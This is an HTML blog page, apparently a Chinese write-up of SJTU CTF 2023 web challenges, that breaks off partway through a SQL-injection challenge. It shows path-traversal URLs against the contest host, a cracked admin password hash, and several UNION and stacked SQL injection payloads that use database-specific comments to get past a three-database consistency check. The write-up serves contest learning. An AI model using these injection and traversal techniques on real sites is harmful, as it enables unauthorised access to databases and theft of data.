@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>SJTU CTF 2023-WriteUp - Andreo Y.</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="SJTU CTF 2023做出的题的WriteUp" /><meta name="keywords" content='SJTUCTF, 信息安全, Web, Misc, Pwn' /><meta itemprop="name" content="SJTU CTF 2023-WriteUp">
+<meta itemprop="description" content="SJTU CTF 2023做出的题的WriteUp"><meta itemprop="datePublished" content="2023-03-12T19:52:23+08:00" />
+<meta itemprop="dateModified" content="2023-03-12T19:52:23+08:00" />
+<meta itemprop="wordCount" content="6513"><meta itemprop="image" content="https://andreoy.cn/logo.png"/>
+<meta itemprop="keywords" content="SJTUCTF,信息安全,Web,Misc,Pwn," /><meta property="og:title" content="SJTU CTF 2023-WriteUp" />
+<meta property="og:description" content="SJTU CTF 2023做出的题的WriteUp" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://andreoy.cn/posts/sjtuctf2023-writeup/" /><meta property="og:image" content="https://andreoy.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-12T19:52:23+08:00" />
+<meta property="article:modified_time" content="2023-03-12T19:52:23+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://andreoy.cn/logo.png"/>
+
+<meta name="twitter:title" content="SJTU CTF 2023-WriteUp"/>
+<meta name="twitter:description" content="SJTU CTF 2023做出的题的WriteUp"/>
+<meta name="application-name" content="Andreo Y.&#39;s Space">
+<meta name="apple-mobile-web-app-title" content="Andreo Y.&#39;s Space"><meta name="theme-color" data-light="#ffffff" data-dark="#252627" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://andreoy.cn/posts/sjtuctf2023-writeup/" /><link rel="prev" href="https://andreoy.cn/posts/zjctf2019-%E9%80%86%E8%BD%AC%E6%80%9D%E7%BB%B4/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><meta name="baidu-site-verification" content="code-NEqykcuT3x" /><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "SJTU CTF 2023-WriteUp",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/andreoy.cn\/posts\/sjtuctf2023-writeup\/"
+    },"genre": "posts","keywords": "SJTUCTF, 信息安全, Web, Misc, Pwn","wordcount":  6513 ,
+    "url": "https:\/\/andreoy.cn\/posts\/sjtuctf2023-writeup\/","datePublished": "2023-03-12T19:52:23+08:00","dateModified": "2023-03-12T19:52:23+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Andreo Y."
+      },"description": ""
+  }
+  </script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3263382266976949"
+     crossorigin="anonymous"></script>
+
+  </head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Andreo Y."><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png 2x"
+    data-sizes="auto"
+    alt="Andreo Y."
+    title="Andreo Y."/><span class="header-title-text"> Andreo Y.&#39;s Space</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-stream fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tag fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-user-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-user-friends fa-fw fa-sm" aria-hidden="true"></i> 友情链接</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search for everything..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Andreo Y."><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png 2x"
+    data-sizes="auto"
+    alt="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png"
+    title="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png"/><span class="header-title-text"> Andreo Y.&#39;s Space</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search for everything..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-stream fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tag fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-user-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-user-friends fa-fw fa-sm" aria-hidden="true"></i> 友情链接</a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="narrow"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    
+</aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>SJTU CTF 2023-WriteUp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://andreoy.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://gravatar.loli.net/avatar/d8234597e50620ab663b4a6e7e89bf99?s=32&amp;d="
+    data-srcset="https://gravatar.loli.net/avatar/d8234597e50620ab663b4a6e7e89bf99?s=32&amp;d=, https://gravatar.loli.net/avatar/d8234597e50620ab663b4a6e7e89bf99?s=32&amp;d= 1.5x, https://gravatar.loli.net/avatar/d8234597e50620ab663b4a6e7e89bf99?s=32&amp;d= 2x"
+    data-sizes="auto"
+    alt="Andreo Y."
+    title="Andreo Y."/>&nbsp;Andreo Y.</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 信息安全</a></span></div>
+      <div class="post-meta-line"><span title=2023-03-12&#32;19:52:23><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-12">2023-03-12</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 6513 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 13 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="SJTU CTF 2023-WriteUp">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="featured-image"><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-12%20195727.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-12%20195727.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-12%20195727.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-12%20195727.png 2x"
+    data-sizes="auto"
+    alt="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-12%20195727.png"
+    title="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-12%20195727.png"/></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">WEB</a>
+      <ul>
+        <li><a href="#flag-gallery">flag gallery</a></li>
+        <li><a href="#mimic-sqlpart-1">Mimic SQL(PART 1)</a></li>
+        <li><a href="#mimic-sqlpart-2">Mimic SQL(PART 2)</a></li>
+        <li><a href="#baby-php">baby php</a></li>
+        <li><a href="#ezjsp">ezjsp</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">PWN</a>
+      <ul>
+        <li><a href="#简单的rpg1">简单的RPG1</a></li>
+        <li><a href="#简单的rpg2">简单的RPG2</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#baby-equation">baby equation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div
+      class="content"
+      id="content"
+      
+      
+    ><h2 id="web">WEB</h2>
+<h3 id="flag-gallery">flag gallery</h3>
+<h4 id="考察点">考察点</h4>
+<p>网页源代码的信息获取和简单php代码的分析</p>
+<h4 id="攻击流程">攻击流程</h4>
+<ol>
+<li>
+<p>首先查看主页的源代码，发现旗帜的地址都是在/getflag.php下，修改flag参数的值</p>
+</li>
+<li>
+<p>考虑将flag参数的值修改成index.php，以查看其php源代码</p>
+<pre tabindex="0"><code>http://34aeb43ce75d4f84b23d71b7671bf83c.penguin.0ops.sjtu.cn:18080/getflag.php?flag=../index.php
+</code></pre></li>
+<li>
+<p>注意到，需要以admin身份登录，即可获得CTF flag</p>
+</li>
+<li>
+<p>再将flag参数值修改为login.php，查看登录界面的源代码</p>
+<pre tabindex="0"><code>http://34aeb43ce75d4f84b23d71b7671bf83c.penguin.0ops.sjtu.cn:18080/getflag.php?flag=../login.php
+</code></pre></li>
+<li>
+<p>容易发现，只要用户名是admin，密码的md5值为<code>2ca3ea99d9cf2b4adbf3c3ea9df345cd</code>，就可以登录</p>
+</li>
+<li>
+<p>随便找一个md5的解码器，得到密码sjtuctf，登录后即可看到CTF</p>
+</li>
+</ol>
+<h3 id="mimic-sqlpart-1">Mimic SQL(PART 1)</h3>
+<h4 id="考察点-1">考察点</h4>
+<p>本题的考察点是SQL注入防护的绕过，后台分别是MySQL、MariaDB、SQLite三个数据库，通过mimic_query函数将SQL语句分别在3个数据库里执行，只有返回结果相同才会正常显示，否则就认为是Hacker行为。</p>
+<h4 id="漏洞点">漏洞点</h4>
+<p>本题的漏洞点在于URL：/article?id=1，其中的id参数存在注入。</p>
+<h4 id="攻击过程">攻击过程</h4>
+<ul>
+<li>
+<p>第一步：通过代码审计，确定id参数存在注入：
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/087c6adfef7248729403d757a9a452fb.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/087c6adfef7248729403d757a9a452fb.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/087c6adfef7248729403d757a9a452fb.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/087c6adfef7248729403d757a9a452fb.png 2x"
+    data-sizes="auto"
+    alt="087c6adfef7248729403d757a9a452fb.png"
+    title="087c6adfef7248729403d757a9a452fb.png"/>
+从initdb函数可以知道，FLAG1存在flag表的flag字段中。</p>
+</li>
+<li>
+<p>第二步：通过order by N方法，确定查询字段数为3</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">20</span><span class="k">order</span><span class="o">%</span><span class="mi">20</span><span class="k">by</span><span class="o">%</span><span class="mi">203</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>第三步：通过UNION，从flag表查询flag字段</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">flag</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">flag</span><span class="w">
+</span></span></span></code></pre></div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/2f718d20dd7a3d5c9cbc2c715eea06ea.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/2f718d20dd7a3d5c9cbc2c715eea06ea.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/2f718d20dd7a3d5c9cbc2c715eea06ea.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/2f718d20dd7a3d5c9cbc2c715eea06ea.png 2x"
+    data-sizes="auto"
+    alt="2f718d20dd7a3d5c9cbc2c715eea06ea.png"
+    title="2f718d20dd7a3d5c9cbc2c715eea06ea.png"/></p>
+<h4 id="exp">EXP</h4>
+<p>EXP如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">flag</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">flag</span><span class="w">
+</span></span></span></code></pre></div><h3 id="mimic-sqlpart-2">Mimic SQL(PART 2)</h3>
+<h4 id="考察点-2">考察点</h4>
+<p>本题的考察点是SQL注入防护的绕过，后台分别是MySQL、MariaDB、SQLite三个数据库，通过mimic_query函数将SQL语句分别在3个数据库里执行，只有返回结果相同才会正常显示，否则就认为是Hacker行为。从initdb函数可以知道，FLAG2被分成3个部分，存在3个数据库的随机表和随机字段中。所以关键是考察如何让一个为了查询某库某表某个字段的SQL语句在其他两个库中执行时也能返回相同结果。</p>
+<h4 id="漏洞点-1">漏洞点</h4>
+<p>本题的漏洞点在于URL：/article?id=1，其中的id参数存在注入。</p>
+<h4 id="攻击过程-1">攻击过程</h4>
+<ul>
+<li>步骤1：注入点、字段数和显示位置的判断同PART 1</li>
+<li>步骤2：利用<code>/*M! XXX语句 */</code>形式的注释，使用Burp在MariaDB中爆破表名。表名第一个字符的EXP如下：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*M!+UNION+SELECT+1,SUBSTRING(TABLE_NAME,1,1),&#39;3&#39;+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=&#39;ctf&#39;+AND+TABLE_NAME+NOT+IN(&#39;flag&#39;,&#39;article&#39;)*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>第一个字符为d
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/7b777e2894b4133c756d18b82ae7c6b9.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/7b777e2894b4133c756d18b82ae7c6b9.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/7b777e2894b4133c756d18b82ae7c6b9.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/7b777e2894b4133c756d18b82ae7c6b9.png 2x"
+    data-sizes="auto"
+    alt="7b777e2894b4133c756d18b82ae7c6b9.png"
+    title="7b777e2894b4133c756d18b82ae7c6b9.png"/></p>
+<p>依次爆破2-8个字符，得到表名：d2db1ae3</p>
+<ul>
+<li>步骤3：同样爆破获得字段名。第一个字符的EXP如下：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*M!+UNION+SELECT+1,SUBSTRING(COLUMN_NAME,1,1),&#39;3&#39;+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=&#39;d2db1ae3&#39;+AND+COLUMN_NAME!=&#39;id&#39;*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>第一个字符为e
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/fd41fc8f5172359f4650e859ede001be.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/fd41fc8f5172359f4650e859ede001be.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/fd41fc8f5172359f4650e859ede001be.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/fd41fc8f5172359f4650e859ede001be.png 2x"
+    data-sizes="auto"
+    alt="fd41fc8f5172359f4650e859ede001be.png"
+    title="fd41fc8f5172359f4650e859ede001be.png"/></p>
+<p>依次爆破2-8个字符，得到字段名：ee8e3321</p>
+<ul>
+<li>步骤4：查询表d2db1ae3内的字段ee8e3321得到FLAG的Part 3。其中第一个字符的EXP如下：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*M!+UNION+SELECT+1,SUBSTRING(ee8e3321,1,1),&#39;3&#39;+FROM+d2db1ae3*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>第一个字符为f
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/ca5b778f6a7276d5ba074b8a8cc567a8.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/ca5b778f6a7276d5ba074b8a8cc567a8.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/ca5b778f6a7276d5ba074b8a8cc567a8.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/ca5b778f6a7276d5ba074b8a8cc567a8.png 2x"
+    data-sizes="auto"
+    alt="ca5b778f6a7276d5ba074b8a8cc567a8.png"
+    title="ca5b778f6a7276d5ba074b8a8cc567a8.png"/></p>
+<p>依次获得FLAG第3部分为fa16bf7cc1daa}</p>
+<ul>
+<li>步骤5：获得MySQL内的表名，EXP如下：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*!+UNION+SELECT+1,SUBSTRING(TABLE_NAME,1,1),&#39;3&#39;+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=&#39;ctf&#39;+AND+TABLE_NAME+NOT+IN(&#39;flag&#39;,&#39;article&#39;,&#39;d2db1ae3&#39;)*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/72c1113f8f1bc5ba7ec0b91887647122.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/72c1113f8f1bc5ba7ec0b91887647122.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/72c1113f8f1bc5ba7ec0b91887647122.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/72c1113f8f1bc5ba7ec0b91887647122.png 2x"
+    data-sizes="auto"
+    alt="72c1113f8f1bc5ba7ec0b91887647122.png"
+    title="72c1113f8f1bc5ba7ec0b91887647122.png"/></p>
+<p>得到表名：2b5dc37c</p>
+<ul>
+<li>步骤6： 获得MySQL内的字段名，EXP如下：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*!+UNION+SELECT+1,SUBSTRING(COLUMN_NAME,1,1),&#39;3&#39;+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=&#39;2b5dc37c&#39;+AND+COLUMN_NAME!=&#39;id&#39;*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>得到字段名：d4675590</p>
+<ul>
+<li>步骤7：在MariaDB中创建表2b5dc37c</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="cm">/*M!CREATE+TABLE+`2b5dc37c`(`d4675590`+TEXT)*/</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>步骤8：查询表2b5dc37c内的字段d4675590得到FLAG的Part 2。其中第一个字符的EXP如下：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*!+UNION+SELECT+1,SUBSTRING(d4675590,1,1),&#39;3&#39;+FROM+2b5dc37c*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>依次爆破得到 FLAG的第2部分：6f3a94ab6604</p>
+<ul>
+<li>步骤8：在MySQL和MariaDB中创建sqlite_master表。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="cm">/*!CREATE+TABLE+`sqlite_master`(`name`+TEXT,`type`+TEXT,`sql`+TEXT)*/</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>步骤9：从sqlite_master表查询SQLite内的flag表名</li>
+</ul>
